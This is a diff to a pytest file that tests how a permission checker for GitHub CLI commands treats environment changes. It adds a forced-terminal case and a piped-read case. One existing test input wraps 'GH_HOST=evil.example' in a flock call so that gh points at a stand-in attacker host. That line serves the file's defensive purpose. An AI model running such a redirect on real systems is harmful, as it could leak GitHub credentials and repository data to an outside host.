@@ -75,6 +75,7 @@ def test_a_variable_set_on_the_line_makes_every_gh_call_ask(name: str, form: str
         pytest.param("timeout 5 gh pr view 1", id="a read behind a wrapper"),
         pytest.param("flock /tmp/l -c 'GH_HOST=evil.example gh pr view 1'", id="a script run by flock"),
         pytest.param("printf -v1 GH_REPO; gh pr view 1", id="printf with an attached -v value"),
+        pytest.param("GH_FORCE_TTY=1 gh pr view 1", id="a forced terminal on the line"),
     ],
 )
 def test_other_ways_to_change_the_environment_ask(command: str) -> None:
@@ -89,6 +90,7 @@ def test_other_ways_to_change_the_environment_ask(command: str) -> None:
         pytest.param("true && gh pr view 1", id="an and-list without an assignment"),
         pytest.param(f"{WRITE.replace('-b ok', '-b')} 'set GH_REPO=other/r in the docs'", id="a name in prose"),
         pytest.param("gh pr list --search 'HTTPS_PROXY=x'", id="an assignment-like search query"),
+        pytest.param("gh pr view 1 | head -3", id="a read through a filter"),
     ],
 )
 def test_plain_forms_without_an_environment_change_stay_allowed(command: str) -> None:
